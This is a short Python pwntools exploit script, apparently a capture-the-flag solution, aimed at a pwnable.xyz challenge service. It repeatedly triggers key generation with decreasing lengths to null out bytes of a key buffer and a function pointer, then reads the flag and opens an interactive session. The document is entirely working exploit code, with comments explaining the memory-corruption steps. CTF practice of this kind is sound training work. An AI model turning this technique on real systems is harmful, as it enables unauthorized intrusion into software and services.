from pwn import *
import time

io = remote("svc.pwnable.xyz", 30006)
# io = process("./challenge")

def zeroKeys():
	for i in range(0x40, 0, -1):
		io.sendlineafter("> ", "1")
		io.sendlineafter("key len: ", str(i))
		time.sleep(0.3)

# fill do_comment = f_do_comment
io.sendlineafter("> ", "3")
io.sendafter("Wanna take a survey instead? ", "y")
io.sendline("comment")

# zeroKeys: key[1:] = null and *(char*)do_comment = null
zeroKeys()

# load flag
io.sendlineafter("> ", "2")
io.interactive()
